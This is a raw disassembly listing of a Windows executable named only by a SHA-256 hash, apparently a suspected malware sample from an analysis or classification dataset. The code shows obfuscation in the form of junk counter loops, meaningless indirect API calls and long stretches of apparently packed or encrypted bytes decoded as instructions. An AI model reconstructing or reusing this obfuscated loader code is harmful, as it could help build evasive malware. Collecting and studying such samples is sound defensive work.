
cfedadf3824f0e8c910b6938fd28163f9978df0073b22111da4f19b554bb854f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433697,0x1c
  401013:	cmp    DWORD PTR ds:0x433697,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433697,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433697,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433697
  401055:	dec    eax
  401056:	mov    ds:0x433697,eax
  40105b:	mov    eax,ds:0x433697
  401060:	dec    eax
  401061:	mov    ds:0x433697,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43369b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43369f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4336d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4336af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433693
  4010b6:	mov    DWORD PTR ds:0x4336af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43372b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4336af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4336af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4336af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4336af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4336af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4336af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4336af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4336af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433677
  40113c:	mov    eax,ds:0x433733
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43371b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4335ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43361f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43365b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [esi],bh
  4011b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011b9:	mov    dh,0x94
  4011bb:	jle    0x40123b
  4011bd:	jle    0x40123d
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [eax],edi
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0xd3b73a
  40126d:	es loop 0x4012b0
  401270:	cmp    bh,BYTE PTR [eax+0x518beb2a]
  401276:	jns    0x4012d8
  401278:	neg    DWORD PTR [ebx-0x47]
  40127b:	retw   0x6f28
  40127f:	dec    ebx
  401280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401281:	jae    0x401232
  401283:	jecxz  0x40129c
  401285:	hlt    
  401286:	ins    BYTE PTR es:[edi],dx
  401287:	mov    BYTE PTR [edx-0x3],ch
  40128a:	pop    ecx
  40128b:	scas   eax,DWORD PTR es:[edi]
  40128c:	dec    ecx
  40128d:	mov    ds:0xb3f3da9a,al
  401292:	shl    DWORD PTR [edx+0x6611c33c],1
  401298:	adc    dl,BYTE PTR [edx+0x19]
  40129b:	jmp    0xfdef:0x3cd956e2
  4012a2:	mov    ecx,0xe3b9749d
  4012a7:	sub    bh,BYTE PTR [edi]
  4012a9:	mov    ss,edi
  4012ab:	dec    esp
  4012ac:	jmp    0x92ce:0x392ba4c6
  4012b3:	inc    DWORD PTR [eax+0x14ebebd]
  4012b9:	ins    BYTE PTR es:[edi],dx
  4012ba:	mov    bl,0x22
  4012bc:	test   eax,0x2086e9d6
  4012c1:	clc    
  4012c2:	hlt    
  4012c3:	push   0x27715c3a
  4012c8:	fnstenv [edx+0x7ead893e]
  4012ce:	test   eax,0x3e26b141
  4012d3:	add    DWORD PTR [ebx+0x5dc67af6],edx
  4012d9:	sub    al,0x3e
  4012db:	sub    dh,cl
  4012dd:	xor    esi,DWORD PTR [bp-0x4769]
  4012e2:	and    ebp,DWORD PTR [esi+ecx*1+0x1786c84b]
  4012e9:	jp     0x4012ae
  4012eb:	scas   al,BYTE PTR es:[edi]
  4012ec:	data16 daa 
  4012ee:	xchg   ebx,eax
  4012ef:	or     DWORD PTR [ebx],ebx
  4012f1:	jns    0x401346
  4012f3:	bound  ebx,QWORD PTR [ebp-0xe512550]
  4012f9:	hlt    
  4012fa:	adc    eax,0xebdb9f65
  4012ff:	cmp    DWORD PTR [ebx],0xffffffa3
  401302:	xor    BYTE PTR [esi+0x3a],cl
  401305:	sar    BYTE PTR [esi],1
  401307:	sub    ch,BYTE PTR [esi]
  401309:	add    eax,DWORD PTR [eax]
  40130b:	rcr    DWORD PTR [esi-0x8],0xf9
  40130f:	data16 loop 0x401387
  401312:	xchg   esi,ebx
  401314:	mov    DWORD PTR [ecx],0xa478939f
  40131a:	lods   al,BYTE PTR ds:[esi]
  40131b:	xor    dl,BYTE PTR [esi-0x447c3931]
  401321:	fstp   TBYTE PTR [ebp+0x7d3ec6f7]
  401327:	div    BYTE PTR [ecx]
  401329:	(bad)  
  40132a:	out    dx,eax
  40132b:	jne    0x401324
  40132d:	or     al,0xe9
  40132f:	pusha  
  401330:	sbb    al,0x7e
  401332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401333:	test   DWORD PTR [ebp+0x1425e8ec],esp
  401339:	cs mov ch,0x9
  40133c:	mov    eax,ds:0xa660a11e
  401341:	sbb    BYTE PTR [eax-0x4fc82d94],ah
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433653,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433653
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433653,ebx
  401366:	cmp    DWORD PTR ds:0x433653,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433653,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43360b,0x4335ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	shl    DWORD PTR [ebp+esi*2-0x50],1
  4013b7:	cli    
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x401421
  4013c0:	je     0x401360
  4013c2:	sbb    al,0xe2
  4013c4:	sub    BYTE PTR [edx+0x4f746d52],bh
  4013ca:	mov    dl,0xc7
  4013cc:	dec    edx
  4013cd:	cmp    BYTE PTR [ecx],ah
  4013cf:	sbb    ah,bh
  4013d1:	lods   al,BYTE PTR ds:[esi]
  4013d2:	pop    esi
  4013d3:	retf   0xe1ac
  4013d6:	gs mov eax,0x7816efdf
  4013dc:	cmp    BYTE PTR [ecx],bl
  4013de:	pop    ebp
  4013df:	cmc    
  4013e0:	mov    eax,ds:0x31d93aeb
  4013e5:	mov    al,ds:0x3cf94074
  4013ea:	and    al,0xe1
  4013ec:	pop    ss
  4013ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013ee:	into   
  4013ef:	ret    0xd6d1
  4013f2:	mov    esi,0xe0fc4c6f
  4013f7:	imul   ecx,DWORD PTR [ecx],0x71a49ae1
  4013fd:	lea    eax,[eax-0x6a]
  401400:	lea    ebx,ds:0x51570d68
  401406:	xchg   ebx,eax
  401407:	xchg   BYTE PTR [edi+0x478873b7],ch
  40140d:	in     eax,dx
  40140e:	pusha  
  40140f:	fdiv   QWORD PTR [ecx+0x1219265]
  401415:	inc    ecx
  401416:	fsub   DWORD PTR [ecx-0x13]
  401419:	and    al,0x4d
  40141b:	mov    edi,0x89fc8f45
  401420:	shl    BYTE PTR [edx+0x53],cl
  401423:	adc    al,0x2a
  401425:	inc    ebx
  401426:	sbb    al,0xcf
  401428:	mul    BYTE PTR [edx+0x697a7be6]
  40142e:	test   al,dl
  401430:	or     eax,0x5f9611cd
  401435:	(bad)  
  401436:	push   esp
  401437:	sub    ebp,eax
  401439:	shl    BYTE PTR [ebx],cl
  40143b:	pop    ss
  40143c:	inc    ebp
  40143d:	fistp  DWORD PTR [esi]
  40143f:	mov    ds:0xdc5031dc,eax
  401444:	add    DWORD PTR fs:[ebx-0x7fde9cd4],0x59
  40144c:	fist   WORD PTR [ecx-0x47]
  40144f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401450:	mov    ds:0xa0224074,eax
  401455:	(bad)  
  401456:	mov    eax,0xc0ed2b5a
  40145b:	jb     0x40146f
  40145d:	inc    ecx
  40145e:	ror    DWORD PTR ss:0x309ba854,cl
  401465:	fs loopne 0x4013f9
  401468:	fdiv   DWORD PTR [ecx+ebp*2+0xb]
  40146c:	cmp    BYTE PTR [ebp-0x7a],bh
  40146f:	sbb    dl,BYTE PTR [edi]
  401471:	lods   al,BYTE PTR ds:[esi]
  401472:	jb     0x401419
  401474:	add    BYTE PTR [esi+0x23],bh
  401477:	xor    edi,DWORD PTR [ebx]
  401479:	ret    0x85e7
  40147c:	cs inc esi
  40147e:	sub    DWORD PTR [ecx+0x17e74196],esp
  401484:	outs   dx,DWORD PTR ds:[esi]
  401485:	pop    esi
  401486:	hlt    
  401487:	imul   edx,edi,0x9a64af59
  40148d:	sub    DWORD PTR [edi-0x2aa0daea],edi
  401493:	fist   WORD PTR [edx]
  401495:	sub    ebp,edx
  401497:	add    BYTE PTR [edi-0xe1771ce],dl
  40149d:	stos   DWORD PTR es:[edi],eax
  40149e:	arpl   ax,di
  4014a0:	test   al,0x1a
  4014a2:	dec    esp
  4014a3:	aas    
  4014a4:	bndldx (bad),[eax+0x13ffc783]
  4014ab:	leave  
  4014ac:	loopne 0x4014f8
  4014ae:	inc    edi
  4014af:	mov    ebx,0x55deec1a
  4014b4:	loopne 0x4014fd
  4014b6:	mov    edx,0x151abbde
  4014bb:	xor    BYTE PTR [esi],ah
  4014bd:	fsub   QWORD PTR [ebp+0x2]
  4014c0:	ins    DWORD PTR es:[edi],dx
  4014c1:	pop    edx
  4014c2:	lahf   
  4014c3:	aas    
  4014c4:	push   eax
  4014c5:	cmp    eax,0xe58d49e8
  4014ca:	fs dec esp
  4014cc:	dec    ebp
  4014cd:	test   BYTE PTR [eax-0x75],ch
  4014d0:	mov    al,ds:0xf3a41001
  4014d5:	push   es
  4014d6:	test   al,0x12
  4014d8:	and    al,BYTE PTR [ecx+edi*2]
  4014db:	pop    ebp
  4014dc:	das    
  4014dd:	pop    ecx
  4014de:	call   0x89bf6ca6
  4014e3:	daa    
  4014e4:	mov    ebx,0xb676b400
  4014e9:	fisttp DWORD PTR [esp+edi*4-0x5ffa60c7]
  4014f0:	mov    eax,0x623010d0
  4014f5:	add    dl,BYTE PTR [eax-0x1e]
  4014f8:	ins    DWORD PTR es:[edi],dx
  4014f9:	pop    edx
  4014fa:	icebp  
  4014fb:	xchg   esp,eax
  4014fc:	out    dx,al
  4014fd:	xor    eax,0x1ad81b60
  401502:	mov    ebp,0xcfd1c288
  401507:	pop    ebx
  401508:	ds ja  0x4014d8
  40150b:	pop    ebp
  40150c:	lock mov DWORD PTR [edx-0x66],ecx
  401510:	data16 cli 
  401512:	xchg   ebp,eax
  401513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401514:	sub    eax,0x76e46873
  401519:	stos   BYTE PTR es:[edi],al
  40151a:	test   al,0xd4
  40151c:	fucomi st,st(7)
  40151e:	push   ds
  40151f:	mov    ch,0x9e
  401521:	test   esi,edi
  401523:	cmp    bl,BYTE PTR [ecx]
  401525:	clc    
  401526:	in     al,0xf1
  401528:	sub    ebx,ebp
  40152a:	jo     0x4015ab
  40152c:	mov    ss,WORD PTR [esi+0x318db6c6]
  401532:	ss jg  0x401517
  401535:	stos   DWORD PTR es:[edi],eax
  401536:	dec    ebx
  401537:	pop    ebp
  401538:	popf   
  401539:	aam    0xd
  40153b:	adc    bl,0xbb
  40153e:	mov    dl,0xbb
  401540:	retf   
  401541:	adc    al,0x69
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43360f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x567d3de3]
  401564:	add    DWORD PTR [esi],eax
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x4015b0
  40156e:	sub    eax,0x8271f52e
  401573:	gs mov eax,0xbbe7e01c
  401579:	adc    BYTE PTR [ecx+0x54],bh
  40157c:	cmp    DWORD PTR [ebp+0x70c3a921],edi
  401582:	mov    al,BYTE PTR [eax-0x3933de61]
  401588:	jle    0x4015d1
  40158a:	mov    bh,0x19
  40158c:	adc    dl,BYTE PTR [esi]
  40158e:	test   al,0xc
  401590:	call   0x3235:0x5798
  401596:	jmp    0x401541
  401598:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401599:	in     al,dx
  40159a:	jae    0x401526
  40159c:	push   edi
  40159d:	pop    esp
  40159e:	(bad)  
  40159f:	jl     0x4015c7
  4015a1:	xchg   edi,eax
  4015a2:	icebp  
  4015a3:	lods   al,BYTE PTR ds:[esi]
  4015a4:	iret   
  4015a5:	outs   dx,BYTE PTR ds:[esi]
  4015a6:	cmp    esi,DWORD PTR [edx-0x3c46f41f]
  4015ac:	ficom  WORD PTR [esi+0x3b98b5f7]
  4015b2:	fwait
  4015b3:	xchg   ecx,edx
  4015b5:	xor    ebp,esi
  4015b7:	jl     0x40154a
  4015b9:	idiv   BYTE PTR [eax-0x4bce7e6]
  4015bf:	inc    esi
  4015c0:	not    DWORD PTR gs:[esi]
  4015c3:	retf   
  4015c4:	sbb    ah,bh
  4015c6:	cli    
  4015c7:	aas    
  4015c8:	sbb    BYTE PTR [esi+0x7063ff56],bh
  4015ce:	jne    0x4015e3
  4015d0:	sub    DWORD PTR [ebx],edi
  4015d2:	dec    eax
  4015d3:	push   ecx
  4015d4:	div    edi
  4015d6:	fstp   DWORD PTR [edx+eiz*4]
  4015d9:	in     eax,dx
  4015da:	sub    BYTE PTR [eax],0x2a
  4015dd:	test   al,0x20
  4015df:	(bad)  
  4015e0:	dec    edx
  4015e1:	cmp    al,0xba
  4015e3:	add    BYTE PTR [eax+0x18],dl
  4015e6:	dec    esi
  4015e7:	push   0xdaeab0bd
  4015ec:	xchg   edi,eax
  4015ed:	icebp  
  4015ee:	push   ds
  4015ef:	inc    edx
  4015f0:	ror    DWORD PTR gs:[ebx-0x74],0x6
  4015f5:	dec    edx
  4015f6:	mov    ebx,0x5a62d658
  4015fb:	inc    edi
  4015fc:	jge    0x4015a0
  4015fe:	mov    bh,0x8e
  401600:	dec    esi
  401601:	or     DWORD PTR [esp+eax*1+0x6c],ebp
  401605:	cwde   
  401606:	mov    ebp,DWORD PTR [edx-0xc3e7bea]
  40160c:	add    eax,0x981466ab
  401611:	jae    0x40166a
  401613:	cmc    
  401614:	ret    
  401615:	sti    
  401616:	test   DWORD PTR [ecx],0xddd70c11
  40161c:	mov    ch,0x9a
  40161e:	mov    al,ds:0xac7ebba5
  401623:	pop    ecx
  401624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401625:	sbb    al,0x10
  401627:	repz and DWORD PTR [edx+0x7],ebp
  40162b:	fimul  DWORD PTR [esi-0xd2d7774]
  401631:	mov    al,ds:0x19dbfc00
  401636:	sub    al,BYTE PTR [ebx]
  401638:	int3   
  401639:	inc    esi
  40163a:	jmp    0x90a6:0xf0ac64fd
  401641:	sub    al,0x95
  401643:	repz mov ds:0x9368111a,al
  401649:	int    0x51
  40164b:	shr    BYTE PTR [edi+0x1bb208ff],cl
  401651:	mov    ah,0x3a
  401653:	fisttp DWORD PTR [edi-0x72edf7a]
  401659:	push   esp
  40165a:	popf   
  40165b:	sub    al,0x1c
  40165d:	sbb    BYTE PTR [eax],bl
  40165f:	sub    al,0xe5
  401661:	dec    ebp
  401662:	mov    esi,0xfbea3f1f
  401667:	jne    0x4016d7
  401669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40166a:	mov    al,0x3
  40166c:	mov    esp,0xba12325b
  401671:	loop   0x401635
  401673:	retf   
  401674:	jp     0x401676
  401676:	dec    ebp
  401677:	push   esi
  401678:	loopne 0x4016b2
  40167a:	jg     0x40165b
  40167c:	retf   0x945a
  40167f:	or     DWORD PTR [ebx+edx*4],esi
  401682:	jp     0x401606
  401684:	mov    BYTE PTR [edx],dh
  401686:	add    DWORD PTR [ebp+0x544a84f7],0xae05a624
  401690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401691:	cmp    ch,BYTE PTR [ebx+eiz*2-0x1f8b6a8]
  401698:	inc    sp
  40169a:	jno    0x4016b7
  40169c:	inc    ecx
  40169d:	xchg   edx,eax
  40169e:	jmp    0x401646
  4016a0:	test   bh,dh
  4016a2:	repnz adc al,0x58
  4016a5:	inc    ebp
  4016a6:	test   dh,0x1a
  4016a9:	cmp    BYTE PTR [edx-0xb62976c],cl
  4016af:	gs rep stos DWORD PTR es:[edi],eax
  4016b2:	adc    DWORD PTR [ecx],esi
  4016b4:	pusha  
  4016b5:	push   cs
  4016b6:	in     eax,dx
  4016b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016b8:	bound  esi,QWORD PTR [esi+esi*1]
  4016bb:	mov    WORD PTR [edx-0x488db106],fs
  4016c1:	fimul  WORD PTR [edx-0x554ddbd4]
  4016c7:	sahf   
  4016c8:	shl    BYTE PTR [eax],1
  4016ca:	mov    bl,0x1a
  4016cc:	jp     0x401745
  4016ce:	inc    ebp
  4016cf:	add    DWORD PTR [edi-0x74],0xf4c72480
  4016d6:	adc    al,0x8f
  4016d8:	test   cl,al
  4016da:	inc    edx
  4016db:	in     al,dx
  4016dc:	sbb    eax,0x1ecc5cd3
  4016e1:	sub    al,0x45
  4016e3:	mov    esp,0x6ad72cd9
  4016e8:	add    eax,0xbc50170a
  4016ed:	xchg   edi,eax
  4016ee:	mov    dh,0x9a
  4016f0:	add    eax,0x4589c703
  4016f5:	int3   
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4336df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4336df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4336df,ebx
  401721:	cmp    DWORD PTR ds:0x4336df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4336df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4336df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4336df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4336df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433603,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433617
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43360b
  401793:	and    ecx,DWORD PTR ds:0x43365b
  401799:	mov    DWORD PTR ds:0x43360b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43372f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43372f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43372f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43372f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43372f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43372f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43372f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43372f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4336e3,0x0
  401819:	mov    eax,ds:0x4336e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4336e3,eax
  401824:	cmp    DWORD PTR ds:0x4336e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433623
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4336e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43371f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43372b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43372b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43372b,ecx
  401878:	cmp    DWORD PTR ds:0x43372b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43372b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43372b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43372b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43372b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x62d96ade
  4018e9:	pop    ds
  4018ea:	sbb    al,BYTE PTR [edx-0x5818186]
  4018f0:	jg     0x401970
  4018f2:	jle    0x40194a
  4018f4:	add    eax,0x79e1fc00
  4018f9:	ror    ch,0x13
  4018fc:	fisubr WORD PTR [edi+0x2e]
  4018ff:	jo     0x401944
  401901:	jo     0x4018f0
  401903:	sti    
  401904:	and    eax,0x28f0e556
  401909:	pop    eax
  40190a:	or     dl,bh
  40190c:	lahf   
  40190d:	mov    bh,0xd9
  40190f:	inc    ebp
  401910:	inc    edi
  401911:	mov    esp,0xe8bdf92f
  401916:	dec    esi
  401917:	jle    0x4018cd
  401919:	cdq    
  40191a:	scas   eax,DWORD PTR es:[edi]
  40191b:	lock or BYTE PTR ss:[edx-0x9982930],dl
  401923:	into   
  401924:	push   edx
  401925:	sbb    al,0x6f
  401927:	fdivr  QWORD PTR [eax-0x6d2cefe1]
  40192d:	cmp    BYTE PTR [ebx-0xc],ah
  401930:	mov    esi,0x9f207dd6
  401935:	pop    es
  401936:	mov    WORD PTR [edi],?
  401938:	imul   ebx,DWORD PTR [ecx],0xf614180e
  40193e:	loopne 0x4018f3
  401940:	lea    edi,[ecx-0x7b]
  401943:	fucomp st(1)
  401945:	and    eax,0x794ca847
  40194a:	sub    dh,BYTE PTR [ecx]
  40194c:	in     al,0x5c
  40194e:	je     0x4019c7
  401950:	outs   dx,BYTE PTR ds:[esi]
  401951:	cmp    dl,ch
  401953:	jb     0x40198c
  401955:	xchg   eax,esi
  401957:	xchg   edx,eax
  401958:	xchg   esi,eax
  401959:	repz popa 
  40195b:	xor    eax,0x114b584
  401960:	aad    0xa3
  401962:	ret    0x6ddd
  401965:	call   DWORD PTR [eax-0x58]
  401968:	je     0x40192a
  40196a:	pop    ss
  40196b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40196c:	sub    al,0x18
  40196e:	out    0x9d,eax
  401970:	retf   
  401971:	or     DWORD PTR ds:0xd3c653a,esp
  401977:	ins    BYTE PTR es:[edi],dx
  401978:	add    al,0x45
  40197a:	cmp    BYTE PTR [edi+ebp*1-0x66],bl
  40197e:	enter  0x6293,0xef
  401982:	cmp    bl,al
  401984:	cmp    dh,BYTE PTR [eax]
  401986:	lods   eax,DWORD PTR ds:[esi]
  401987:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  401989:	call   esi
  40198b:	pushf  
